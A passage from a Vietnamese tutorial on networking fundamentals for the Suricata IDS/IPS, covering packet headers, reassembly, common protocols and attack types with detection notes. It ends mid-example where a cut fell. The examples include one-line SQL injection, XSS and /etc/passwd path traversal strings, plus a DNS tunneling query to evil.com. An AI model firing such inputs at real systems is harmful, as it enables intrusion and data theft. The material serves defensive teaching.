# Suricata IDS/IPS - Part 1: Kiến thức nền tảng về mạng và bảo mật

*"Phần 1 cung cấp kiến thức nền tảng về mô hình OSI/TCP-IP, cấu trúc gói tin mạng, flow/session/reassembly, các giao thức ứng dụng phổ biến (HTTP, DNS, TLS, SMTP, SSH, FTP, DHCP), và các dạng tấn công mạng (DoS/DDoS, Brute-force, Scan, Injection, Exploit) - những kiến thức cần thiết để hiểu cách IDS/IPS hoạt động."*

## 1. Kiến thức nền tảng

### 1.1. Mô hình OSI và TCP/IP

**Mô hình OSI (7 tầng):**

| Tầng | Tên | Chức năng | Ví dụ giao thức/thiết bị |
|------|-----|-----------|--------------------------|
| 7 | Application | Giao tiếp với ứng dụng người dùng | HTTP, FTP, SMTP, DNS |
| 6 | Presentation | Mã hóa, nén, chuyển đổi dữ liệu | SSL/TLS, JPEG, MPEG |
| 5 | Session | Quản lý phiên kết nối | NetBIOS, RPC |
| 4 | Transport | Truyền tải end-to-end, kiểm soát luồng | TCP, UDP |
| 3 | Network | Định tuyến, địa chỉ logic | IP, ICMP, ARP |
| 2 | Data Link | Truyền dữ liệu trên đường truyền vật lý | Ethernet, Wi-Fi, Switch |
| 1 | Physical | Truyền bit qua môi trường vật lý | Cable, Hub, Repeater |

**Mô hình TCP/IP (4 tầng):**

| Tầng TCP/IP | Tương đương OSI | Giao thức chính |
|-------------|-----------------|-----------------|
| Application | 5-7 (Application, Presentation, Session) | HTTP, FTP, DNS, SMTP |
| Transport | 4 (Transport) | TCP, UDP |
| Internet | 3 (Network) | IP, ICMP, ARP |
| Network Access | 1-2 (Physical, Data Link) | Ethernet, Wi-Fi |

**Quan hệ giữa OSI và TCP/IP:**
- TCP/IP là mô hình thực tế được sử dụng trên Internet
- OSI là mô hình lý thuyết để giảng dạy và phân tích
- Suricata làm việc chủ yếu ở tầng 2-7, phân tích từ Ethernet frame đến Application layer

---

### 1.2. Cấu trúc Ethernet Frame, IP Header, TCP/UDP Segment

#### **1.2.1. Ethernet Frame (Layer 2)**

```
┌─────────────┬─────────────┬──────┬─────────────────────┬─────┐
│  Preamble   │ Dest MAC    │ Src  │      Payload        │ FCS │
│  (8 bytes)  │ (6 bytes)   │ MAC  │   (46-1500 bytes)   │(4B) │
│             │             │ (6B) │                     │     │
└─────────────┴─────────────┴──────┴─────────────────────┴─────┘
                             │ EtherType (2B) │
                             └────────────────┘
```

**Các trường quan trọng:**
- **Destination MAC (6 bytes):** Địa chỉ MAC đích
- **Source MAC (6 bytes):** Địa chỉ MAC nguồn
- **EtherType (2 bytes):** Xác định giao thức tầng trên
  - `0x0800`: IPv4
  - `0x0806`: ARP
  - `0x86DD`: IPv6
  - `0x8100`: VLAN tagged frame
- **Payload (46-1500 bytes):** Dữ liệu (thường là IP packet)
- **FCS (4 bytes):** Frame Check Sequence - kiểm tra lỗi

**Suricata sử dụng:**
- Phân tích MAC address để xác định thiết bị
- EtherType để xác định loại giao thức cần parse tiếp theo
- Hỗ trợ VLAN tagging (802.1Q)

---

#### **1.2.2. IP Header (Layer 3)**

**IPv4 Header:**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version|  IHL  |Type of Service|          Total Length         |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|         Identification        |Flags|      Fragment Offset    |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Time to Live |    Protocol   |         Header Checksum       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                       Source Address                          |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Destination Address                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if IHL > 5)                       |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Các trường quan trọng:**
- **Version (4 bits):** Phiên bản IP (4 cho IPv4, 6 cho IPv6)
- **IHL (4 bits):** Internet Header Length - độ dài header (đơn vị 32-bit words)
- **Total Length (16 bits):** Tổng độ dài packet (header + data), tối đa 65,535 bytes
- **Identification (16 bits):** ID để reassemble các fragment
- **Flags (3 bits):**
  - Bit 0: Reserved (phải = 0)
  - Bit 1: DF (Don't Fragment) = 1 không cho phép phân mảnh
  - Bit 2: MF (More Fragments) = 1 còn fragment phía sau
- **Fragment Offset (13 bits):** Vị trí fragment trong packet gốc (đơn vị 8 bytes)
- **TTL (8 bits):** Time To Live - số hop tối đa (giảm 1 mỗi router)
- **Protocol (8 bits):** Giao thức tầng trên
  - `6`: TCP
  - `17`: UDP
  - `1`: ICMP
  - `47`: GRE
- **Source/Destination Address (32 bits):** Địa chỉ IP nguồn/đích

**Suricata sử dụng:**
- Phát hiện IP fragmentation attacks (Teardrop, Ping of Death)
- Reassemble các fragment để phân tích payload
- Phát hiện TTL anomaly (scanning, tunneling)
- Filtering theo IP address ranges

---

#### **1.2.3. TCP Segment (Layer 4)**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                        Sequence Number                        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Acknowledgment Number                      |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|  Data |           |U|A|P|R|S|F|                               |
| Offset| Reserved  |R|C|S|S|Y|I|            Window             |
|       |           |G|K|H|T|N|N|                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|           Checksum            |         Urgent Pointer        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                    Options (if Data Offset > 5)               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Các trường quan trọng:**
- **Source/Destination Port (16 bits):** Cổng nguồn/đích (0-65535)
- **Sequence Number (32 bits):** Số thứ tự byte đầu tiên trong segment
- **Acknowledgment Number (32 bits):** Số thứ tự byte tiếp theo được mong đợi
- **Data Offset (4 bits):** Độ dài TCP header (đơn vị 32-bit words)
- **Flags (9 bits):**
  - **URG:** Urgent pointer có hiệu lực
  - **ACK:** Acknowledgment number có hiệu lực
  - **PSH:** Push data ngay lập tức
  - **RST:** Reset connection
  - **SYN:** Synchronize - bắt đầu kết nối
  - **FIN:** Finish - kết thúc kết nối
- **Window Size (16 bits):** Số byte có thể nhận (flow control)
- **Checksum (16 bits):** Kiểm tra lỗi cho header và data
- **Options:** MSS, Window Scale, SACK, Timestamps...

**TCP 3-way handshake:**
```
Client                    Server
  │                         │
  │────── SYN ─────────────>│  (SEQ=x)
  │                         │
  │<──── SYN-ACK ──────────│  (SEQ=y, ACK=x+1)
  │                         │
  │────── ACK ─────────────>│  (SEQ=x+1, ACK=y+1)
  │                         │
  │   Connection Established│
```

**TCP connection termination:**
```
Client                    Server
  │────── FIN ─────────────>│
  │<──── ACK ───────────────│
  │<──── FIN ───────────────│
  │────── ACK ─────────────>│
```

**Suricata sử dụng:**
- **Stream reassembly:** Ghép các TCP segment thành stream hoàn chỉnh
- **Session tracking:** Theo dõi trạng thái kết nối TCP
- Phát hiện TCP anomalies:
  - SYN flood (nhiều SYN không có ACK)
  - Invalid flags combination (SYN+FIN, SYN+RST)
  - Out-of-window packets
  - TCP retransmission attacks

---

#### **1.2.4. UDP Datagram (Layer 4)**

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|          Source Port          |       Destination Port        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|            Length             |           Checksum            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                             Data                              |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

**Đặc điểm:**
- **Connectionless:** Không thiết lập kết nối, không đảm bảo tin cậy
- **Header nhỏ gọn:** Chỉ 8 bytes (so với TCP tối thiểu 20 bytes)
- **No flow control, no retransmission**
- **Sử dụng cho:** DNS, DHCP, VoIP, streaming, gaming

**Suricata sử dụng:**
- Phân tích application protocols over UDP (DNS, DHCP...)
- Phát hiện UDP flood attacks
- Detect DNS tunneling, DNS amplification attacks
- DHCP snooping

---

### 1.3. Flow, Session, Reassembly, Fragmentation

#### **1.3.1. Flow**

**Định nghĩa:**
Flow là một chuỗi các packet có cùng 5-tuple trong một khoảng thời gian:
- Source IP
- Destination IP
- Source Port
- Destination Port
- Protocol (TCP/UDP)

**Flow trong Suricata:**
```
Flow: 192.168.1.100:54321 → 93.184.216.34:80 (TCP)
├── Packet 1: SYN
├── Packet 2: SYN-ACK
├── Packet 3: ACK
├── Packet 4: HTTP GET /index.html
├── Packet 5: ACK
├── Packet 6: HTTP 200 OK
├── Packet 7: FIN
└── Packet 8: FIN-ACK
```

**Flow timeout:**
- TCP established: 3600s (mặc định)
- TCP closed: 120s
- UDP: 60s
- ICMP: 30s

**Suricata Flow tracking:**
- Theo dõi trạng thái của mỗi flow
- Áp dụng rules theo context của flow
- Phát hiện session hijacking, man-in-the-middle

---

#### **1.3.2. Session**

**Session vs Flow:**
- **Flow:** Khái niệm ở tầng Network/Transport (IP + Port + Protocol)
- **Session:** Khái niệm ở tầng Application (HTTP session, TLS session)

**Ví dụ HTTP Session:**
```
Flow 1: Client:12345 → Server:80
  │
  ├─ HTTP GET /login.php
  ├─ HTTP 200 OK (Set-Cookie: sessionid=abc123)
  │
Flow 2: Client:12346 → Server:80
  │
  ├─ HTTP GET /dashboard.php (Cookie: sessionid=abc123)
  ├─ HTTP 200 OK
```

**Session tracking trong Suricata:**
- HTTP session tracking qua cookies
- TLS session tracking qua session ID
- FTP session tracking (control + data channels)
- Phát hiện session hijacking, cookie theft

---

#### **1.3.3. Reassembly**

**IP Fragmentation Reassembly:**

Khi IP packet lớn hơn MTU (Maximum Transmission Unit), nó bị phân mảnh:

```
Original packet (3000 bytes):
┌────────────────────────────────────────┐
│         Data (3000 bytes)              │
└────────────────────────────────────────┘

Fragmented (MTU = 1500):
Fragment 1: ┌──────────────────┐
            │ Data (1480 bytes)│  Offset=0, MF=1
            └──────────────────┘

Fragment 2: ┌──────────────────┐
            │ Data (1480 bytes)│  Offset=1480, MF=1
            └──────────────────┘

Fragment 3: ┌──────────┐
            │Data (40B)│  Offset=2960, MF=0
            └──────────┘
```

**Các trường sử dụng:**
- **Identification:** Tất cả fragment cùng packet có ID giống nhau
- **Fragment Offset:** Vị trí của fragment trong packet gốc (đơn vị 8 bytes)
- **MF flag (More Fragments):** 1 = còn fragment phía sau, 0 = fragment cuối

**Tấn công liên quan:**
- **Teardrop attack:** Overlap fragments gây crash
- **Ping of Death:** Fragment lớn hơn 65535 bytes khi reassemble
- **Fragment evasion:** Bypass IDS bằng cách phân mảnh payload

**Suricata reassembly:**
- Cấu hình timeout cho fragment reassembly
- Phát hiện overlapping fragments
- Reassemble trước khi áp dụng detection rules

---

**TCP Stream Reassembly:**

TCP stream reassembly ghép các TCP segment thành luồng dữ liệu hoàn chỉnh:

```
Sequence numbers:
Segment 1: SEQ=1000, Length=500  → Data[1000-1499]
Segment 2: SEQ=1500, Length=300  → Data[1500-1799]
Segment 3: SEQ=1800, Length=400  → Data[1800-2199]

Reassembled stream:
┌───────────────────────────────────────────────┐
│ Data[1000-2199] (1200 bytes continuous)      │
└───────────────────────────────────────────────┘
```

**Challenges:**
- **Out-of-order segments:** Segment đến không theo thứ tự
- **Retransmission:** Segment bị mất và được gửi lại
- **Overlapping segments:** Dữ liệu bị overlap (evasion technique)

**Ví dụ evasion:**
```
Segment 1: SEQ=1000, Data="GET /normal"
Segment 2: SEQ=1005, Data="/malicious"  (overlap!)
Segment 3: SEQ=1015, Data=" HTTP/1.1"

Reassembled có thể là:
- "GET /malicious HTTP/1.1"  (nếu ưu tiên segment mới)
- "GET /normal HTTP/1.1"     (nếu ưu tiên segment cũ)
```

**Suricata stream reassembly:**
- Cấu hình `stream.reassembly.depth` để giới hạn bộ nhớ
- Detect TCP stream evasion techniques
- Normalize stream trước khi pattern matching

---

#### **1.3.4. Fragmentation**

**Tại sao có fragmentation:**
- MTU khác nhau giữa các mạng (Ethernet 1500, PPPoE 1492)
- DF flag = 0 cho phép fragmentation
- IPv6 không hỗ trợ fragmentation tại router (chỉ tại source)

**Path MTU Discovery (PMTUD):**
```
Client                    Router                    Server
  │                         │                         │
  │──── IP packet (DF=1) ──>│                         │
  │        1500 bytes       │ MTU=1400               │
  │                         │                         │
  │<─── ICMP "Frag Needed"─│                         │
  │     MTU=1400            │                         │
  │                         │                         │
  │──── IP packet (1400) ──>│────────────────────────>│
```

**Tấn công fragmentation:**

1. **Teardrop Attack:**
```
Fragment 1: Offset=0, Length=100
Fragment 2: Offset=50, Length=100  (Overlap!)
           ┌──────────────┐
Fragment 1:│   0 - 100    │
           └──────────────┘
                ┌──────────────┐
Fragment 2:     │  50 - 150    │
                └──────────────┘
           ├─Overlap─┤
```
Gây buffer overflow khi reassemble.

2. **Tiny Fragment Attack:**
```
Fragment 1: IP Header + 8 bytes TCP header
Fragment 2: Phần còn lại của TCP header + data
```
Mục đích: Bypass firewall rules chỉ kiểm tra fragment đầu tiên.

3. **Fragment Overlap Attack:**
Gửi các fragment overlap để tránh detection hoặc exploit reassembly logic.

**Suricata defragmentation:**
- `defrag.timeout`: Timeout cho fragment reassembly
- `defrag.max-frags`: Số fragment tối đa cho một packet
- Policies: `first`, `last`, `linux`, `windows` (xử lý overlap khác nhau)

---

### 1.4. Các giao thức ứng dụng phổ biến

#### **1.4.1. HTTP (Hypertext Transfer Protocol)**

**HTTP Request:**
```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0
Accept: text/html
Connection: keep-alive
Cookie: sessionid=abc123

```

**HTTP Response:**
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 1234
Set-Cookie: sessionid=abc123; HttpOnly
Connection: keep-alive

<!DOCTYPE html>
<html>...
```

**HTTP Methods:**
- **GET:** Lấy resource
- **POST:** Gửi dữ liệu (form, upload)
- **PUT:** Tạo/cập nhật resource
- **DELETE:** Xóa resource
- **HEAD:** Giống GET nhưng không trả về body
- **OPTIONS:** Kiểm tra methods được hỗ trợ

**HTTP Status Codes:**
- **1xx:** Informational
- **2xx:** Success (200 OK, 201 Created, 204 No Content)
- **3xx:** Redirection (301 Moved Permanently, 302 Found, 304 Not Modified)
- **4xx:** Client Error (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
- **5xx:** Server Error (500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable)

**Tấn công HTTP:**
- **SQL Injection:** `GET /search?q=' OR '1'='1`
- **XSS:** `GET /search?q=<script>alert(1)</script>`
- **Path Traversal:** `GET /../../../etc/passwd`
- **HTTP Smuggling:** Exploit khác biệt parsing giữa proxy và server
- **Slowloris:** Giữ nhiều kết nối HTTP mở chậm chạp

**Suricata HTTP detection:**
- Parse HTTP headers, methods, URI, status codes
- Decode URL encoding, normalize paths
- Extract và analyze HTTP body
- Keywords: `http.method`, `http.uri`, `http.header`, `http.stat_code`

---

#### **1.4.2. DNS (Domain Name System)**

**DNS Query (UDP port 53):**
```
┌─────────────────────────────┐
│ Transaction ID: 0x1234      │
│ Flags: Standard query       │
│ Questions: 1                │
│ Question: www.example.com   │
│   Type: A (IPv4 address)    │
│   Class: IN (Internet)      │
└─────────────────────────────┘
```

**DNS Response:**
```
┌─────────────────────────────┐
│ Transaction ID: 0x1234      │
│ Flags: Response, No error   │
│ Answers: 1                  │
│ Answer: www.example.com     │
│   Type: A                   │
│   TTL: 300                  │
│   Address: 93.184.216.34    │
└─────────────────────────────┘
```

**DNS Record Types:**
- **A:** IPv4 address
- **AAAA:** IPv6 address
- **CNAME:** Canonical name (alias)
- **MX:** Mail exchange
- **NS:** Name server
- **PTR:** Pointer (reverse DNS)
- **TXT:** Text record (SPF, DKIM, verification)
- **SOA:** Start of Authority

**Tấn công DNS:**
- **DNS Amplification:** Abuse DNS servers để DDoS
  ```
  Attacker → DNS Server: Query ANY example.com (64 bytes)
             Spoofed source = Victim IP
  DNS Server → Victim: Response (3000 bytes)
  Amplification factor: ~50x
  ```
- **DNS Tunneling:** Truyền dữ liệu qua DNS queries/responses
  ```
  Query: 4142434445.evil.com (encode "ABCDE")
  ```
- **DNS Cache Poisoning:** Inject fake DNS records vào cache
- **DNS Hijacking:** Redirect DNS queries đến malicious server
- **DGA (Domain Generation Algorithm):** Botnet C&C domains

**Suricata DNS detection:**
- Parse DNS queries, responses, resource records
- Detect DNS tunneling (unusual query patterns)
- Detect DGA domains (entropy analysis)
- Keywords: `dns.query`, `dns.answer`, `dns.opcode`

---

#### **1.4.3. TLS (Transport Layer Security)**

**TLS Handshake:**
```
Client                              Server
  │                                   │
  │──── ClientHello ────────────────> │
  │  - TLS version                    │
  │  - Cipher suites                  │
  │  - Random                         │
  │  - SNI (Server Name Indication)   │
  │                                   │
  │ <──── ServerHello ───────────────│
  │  - Selected cipher suite          │
  │  - Certificate                    │
  │  - ServerKeyExchange              │
  │  - ServerHelloDone                │
  │                                   │
  │──── ClientKeyExchange ──────────> │
  │──── ChangeCipherSpec ───────────> │
  │──── Finished ────────────────────>│
  │                                   │
  │ <──── ChangeCipherSpec ──────────│
  │ <──── Finished ──────────────────│
  │                                   │
  │   Encrypted Application Data      │
  │<─────────────────────────────────>│
```

**Cipher Suite format:**
```
TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
│   │     │    │    │   │   │   │
│   │     │    │    │   │   │   └─ MAC algorithm (SHA256)
│   │     │    │    │   │   └───── AEAD mode (GCM)
│   │     │    │    │   └─────────── Encryption key size (128)
│   │     │    │    └─────────────── Encryption algorithm (AES)
│   │     │    └──────────────────── Separator
│   │     └───────────────────────── Authentication (RSA)
│   └─────────────────────────────── Key exchange (ECDHE)
└─────────────────────────────────── Protocol (TLS)
```

**TLS Versions:**
- **SSL 2.0/3.0:** Deprecated, insecure
- **TLS 1.0 (1999):** Vulnerable (BEAST, POODLE)
- **TLS 1.1 (2006):** Vulnerable
- **TLS 1.2 (2008):** Secure, widely used
- **TLS 1.3 (2018):** Mới nhất, cải thiện security và performance

**Certificate:**
```
Certificate:
  Version: 3
  Serial Number: 0a:0b:0c...
  Issuer: CN=Let's Encrypt Authority
  Validity:
    Not Before: 2024-01-01 00:00:00
    Not After:  2024-12-31 23:59:59
  Subject: CN=www.example.com
  Subject Public Key Info:
    Algorithm: RSA 2048 bits
  X509v3 Extensions:
    Subject Alternative Name:
      DNS:www.example.com
      DNS:example.com
```

**Tấn công TLS:**
- **Downgrade attacks:** Ép client/server dùng phiên bản yếu hơn
- **BEAST, POODLE, CRIME, BREACH:** Exploit TLS vulnerabilities
- **Heartbleed:** Buffer over-read trong OpenSSL
- **Certificate fraud:** Fake certificate, expired certificate
- **Man-in-the-Middle:** Intercept và decrypt TLS traffic
- **JA3 fingerprinting evasion:** Thay đổi TLS fingerprint

**Suricata TLS detection:**
- Parse TLS handshake (ClientHello, ServerHello)
- Extract SNI (Server Name Indication)
- Validate certificates, check expiration
- Detect weak cipher suites
- JA3/JA3S fingerprinting (identify malware)
- Keywords: `tls.sni`, `tls.cert_subject`, `tls.version`, `tls.cert_fingerprint`

---

#### **1.4.4. SMTP (Simple Mail Transfer Protocol)**

**SMTP Session:**
```
Client                                    Server
  │                                         │
  │ <──── 220 mail.example.com ESMTP ───── │
  │                                         │
  │ ──── EHLO client.example.com ────────> │
  │                                         │
  │ <──── 250-mail.example.com ──────────── │
  │ <──── 250-STARTTLS ─────────────────── │
  │ <──── 250 AUTH PLAIN LOGIN ─────────── │
  │                                         │
  │ ──── MAIL FROM:<sender@example.com> ──>│
  │                                         │
  │ <──── 250 OK ────────────────────────── │
  │                                         │
  │ ──── RCPT TO:<recipient@example.com> ─>│
  │                                         │
  │ <──── 250 OK ────────────────────────── │
  │                                         │
  │ ──── DATA ──────────────────────────> │
  │                                         │
  │ <──── 354 Start mail input ──────────── │
  │                                         │
  │ ──── From: sender@example.com ────────>│
  │ ──── To: recipient@example.com ───────>│
  │ ──── Subject: Test email ─────────────>│
  │ ──── (blank line) ────────────────────>│
  │ ──── Email body ──────────────────────>│
  │ ──── . ───────────────────────────────>│
  │                                         │
  │ <──── 250 OK: Message queued ────────── │
  │                                         │
  │ ──── QUIT ────────────────────────────>│
  │                                         │
  │ <──── 221 Bye ──────────────────────── │
```

**SMTP Commands:**
- **HELO/EHLO:** Identify client
- **MAIL FROM:** Sender address
- **RCPT TO:** Recipient address
- **DATA:** Start message body
- **RSET:** Reset session
- **VRFY:** Verify user
- **EXPN:** Expand mailing list
- **QUIT:** Close connection
- **STARTTLS:** Upgrade to TLS

**SMTP Response Codes:**
- **2xx:** Success (250 OK, 220 Ready)
- **3xx:** More info needed (354 Start mail input)
- **4xx:** Temporary error (450 Mailbox unavailable)
- **5xx:** Permanent error (550 Mailbox not found, 553 Invalid address)

**Tấn công SMTP:**
- **Email Spoofing:** Giả mạo sender address
  ```
  MAIL FROM:<ceo@company.com>
  (Thực tế gửi từ attacker server)
  ```
- **Spam, Phishing:** Gửi email lừa đảo hàng loạt
- **Open Relay abuse:** Lợi dụng SMTP server không xác thực
- **SMTP Command Injection:** Inject commands vào SMTP session
- **Attachment-based malware:** Gửi file độc hại (exe, macro)
- **VRFY/EXPN enumeration:** Liệt kê user accounts

**Suricata SMTP detection:**
- Parse SMTP commands, responses
- Extract email headers (From, To, Subject)
- Detect email spoofing
- Detect suspicious attachments
- Keywords: `smtp.mail`, `smtp.rcpt`, `smtp.helo`

---

#### **1.4.5. SSH (Secure Shell)**

**SSH Connection:**
```
Client                              Server
  │                                   │
  │ ──── TCP 3-way handshake ──────> │ Port 22
  │                                   │
  │ <──── SSH Protocol Version ────── │
  │       "SSH-2.0-OpenSSH_8.2"       │
  │                                   │
  │ ──── SSH Protocol Version ──────> │
  │       "SSH-2.0-OpenSSH_7.9"       │
  │                                   │
  │ <──── Key Exchange Init ────────── │
  │  - Algorithms (KEX, hostkey...)   │
  │                                   │
  │ ──── Key Exchange Init ─────────> │
  │                                   │
  │ <═══ Key Exchange (DH/ECDH) ═════>│
  │                                   │
  │ ──── Authentication Request ────> │
  │  - Password / Public Key          │
  │                                   │
  │ <──── Authentication Success ───── │
  │                                   │
  │   Encrypted Channel Established   │
  │<─────────────────────────────────>│
```

**SSH Authentication Methods:**
- **Password:** Username + password
- **Public Key:** RSA/ECDSA/Ed25519 key pair
- **Keyboard-Interactive:** Challenge-response
- **Host-based:** Trust based on client host
- **GSSAPI:** Kerberos authentication

**Tấn công SSH:**
- **Brute-force:** Thử password/key nhiều lần
  ```
  Fail: admin:password123
  Fail: admin:admin
  Fail: admin:12345
  Success: admin:P@ssw0rd!
  ```
- **Dictionary attack:** Dùng wordlist để brute-force
- **SSH Version scanning:** Xác định phiên bản SSH để exploit
- **Weak encryption algorithms:** Sử dụng cipher yếu (arcfour, des)
- **Man-in-the-Middle:** Intercept SSH keys
- **Tunneling/Port forwarding abuse:** Bypass firewall

**Suricata SSH detection:**
- Parse SSH version banner
- Detect SSH brute-force (nhiều failed login)
- Detect weak SSH ciphers
- Detect unusual SSH traffic patterns
- Keywords: `ssh.proto`, `ssh.software`

---

#### **1.4.6. FTP (File Transfer Protocol)**

**FTP Control Connection (port 21):**
```
Client                              Server
  │                                   │
  │ <──── 220 FTP Server ready ────── │
  │                                   │
  │ ──── USER username ─────────────> │
  │                                   │
  │ <──── 331 Password required ────── │
  │                                   │
  │ ──── PASS password ─────────────> │
  │                                   │
  │ <──── 230 Login successful ──────── │
  │                                   │
  │ ──── PWD ────────────────────────>│
  │                                   │
  │ <──── 257 "/home/user" ─────────── │
  │                                   │
  │ ──── LIST ───────────────────────>│
  │                                   │
  │ <──── 150 Opening data connection ─ │
  │ <──── (File list on data conn) ──── │
  │ <──── 226 Transfer complete ──────── │
```

**FTP Modes:**
- **Active Mode:**
  ```
  Client opens port 1234
  Client → Server: PORT 192,168,1,100,4,210 (port 1234)
  Server:20 → Client:1234 (data connection)
  ```
  Vấn đề: Firewall block incoming connection

- **Passive Mode:**
  ```
  Client → Server: PASV
  Server → Client: 227 Entering Passive Mode (192,168,1,1,195,233)
  Client → Server:50153 (data connection)
  ```
  Server mở port, client kết nối đến

**FTP Commands:**
- **USER/PASS:** Authentication
- **PWD:** Print working directory
- **CWD:** Change working directory
- **LIST:** List files
- **RETR:** Retrieve (download) file
- **STOR:** Store (upload) file
- **DELE:** Delete file
- **MKD/RMD:** Make/Remove directory
- **QUIT:** Disconnect

**Tấn công FTP:**
- **Anonymous FTP abuse:** Login với user "anonymous"
- **FTP Bounce attack:** Sử dụng FTP server làm proxy để scan
  ```
  Client → FTP Server: PORT target_ip,target_port
  FTP Server → Target: Connection attempt
  ```
- **FTP Brute-force:** Thử username/password
- **Directory Traversal:** `RETR ../../../../etc/passwd`
- **Clear-text credentials:** FTP không mã hóa (dùng FTPS/SFTP thay thế)

**Suricata FTP detection:**
- Parse FTP commands, responses
- Detect FTP brute-force
- Detect anonymous FTP login
- Detect FTP bounce attacks
- Keywords: `ftp.command`, `ftp.reply`

---

#### **1.4.7. DHCP (Dynamic Host Configuration Protocol)**

**DHCP 4-way handshake (DORA):**
```
Client                              Server
  │                                   │
  │ ──── DHCP DISCOVER ─────────────> │ (Broadcast)
  │   "I need an IP address"          │
  │                                   │
  │ <──── DHCP OFFER ───────────────── │
  │   "Here's 192.168.1.100"          │
  │   + Subnet, Gateway, DNS...       │
  │                                   │
  │ ──── DHCP REQUEST ──────────────> │ (Broadcast)
  │   "I accept 192.168.1.100"        │
  │                                   │
  │ <──── DHCP ACK ───────────────────── │
  │   "Confirmed, lease time 86400s"  │
```

**DHCP Packet:**
```
┌──────────────────────────────────┐
│ Op: 1 (Request) / 2 (Reply)      │
│ HType: 1 (Ethernet)              │
│ HLen: 6 (MAC address length)     │
│ Hops: 0                          │
│ Transaction ID: 0x12345678       │
│ Client IP: 0.0.0.0               │
│ Your IP: 192.168.1.100           │
│ Server IP: 192.168.1.1           │
│ Gateway IP: 0.0.0.0              │
│ Client MAC: aa:bb:cc:dd:ee:ff    │
│ Options:                         │
│   - Message Type: DISCOVER       │
│   - Requested IP: ...            │
│   - Subnet Mask: 255.255.255.0   │
│   - Router: 192.168.1.1          │
│   - DNS: 8.8.8.8, 8.8.4.4        │
│   - Lease Time: 86400            │
└──────────────────────────────────┘
```

**DHCP Options (một số quan trọng):**
- **Option 1:** Subnet Mask
- **Option 3:** Router (Default Gateway)
- **Option 6:** DNS Server
- **Option 12:** Hostname
- **Option 15:** Domain Name
- **Option 51:** Lease Time
- **Option 53:** DHCP Message Type
- **Option 54:** DHCP Server Identifier

**Tấn công DHCP:**
- **DHCP Starvation:** Gửi nhiều DISCOVER với fake MAC để cạn kiệt IP pool
  ```
  DISCOVER from MAC: 00:11:22:33:44:01
  DISCOVER from MAC: 00:11:22:33:44:02
  DISCOVER from MAC: 00:11:22:33:44:03
  ... (hàng nghìn requests)
  → DHCP server hết IP để cấp phát
  ```
- **Rogue DHCP Server:** Attacker chạy DHCP server giả
  ```
  Legitimate DHCP: 192.168.1.1 (chậm)
  Rogue DHCP: 192.168.1.100 (nhanh hơn)
    → Cấp gateway = attacker IP
    → Man-in-the-Middle attack
  ```
- **DHCP Snooping bypass:** Gửi fake DHCP messages

**Suricata DHCP detection:**
- Parse DHCP messages (DISCOVER, OFFER, REQUEST, ACK)
- Detect DHCP starvation (nhiều requests từ nhiều MAC)
- Detect rogue DHCP servers
- Detect abnormal DHCP options
- Keywords: `dhcp.type`, `dhcp.client_mac`

---

### 1.5. Các dạng tấn công mạng

#### **1.5.1. DoS/DDoS (Denial of Service / Distributed DoS)**

**Mục tiêu:** Làm service/server không khả dụng bằng cách làm quá tải tài nguyên.

**Phân loại:**

**1. Volumetric Attacks (Layer 3/4):**
Làm quá tải băng thông.

- **UDP Flood:**
  ```
  Attacker → Target: UDP packets (hàng triệu packets/giây)
  Target: CPU, bandwidth quá tải
  ```

- **ICMP Flood (Ping Flood):**
  ```
  Attacker → Target: ICMP Echo Request (liên tục)
  Target: Phải xử lý và reply → quá tải
  ```

- **DNS Amplification:**
  ```
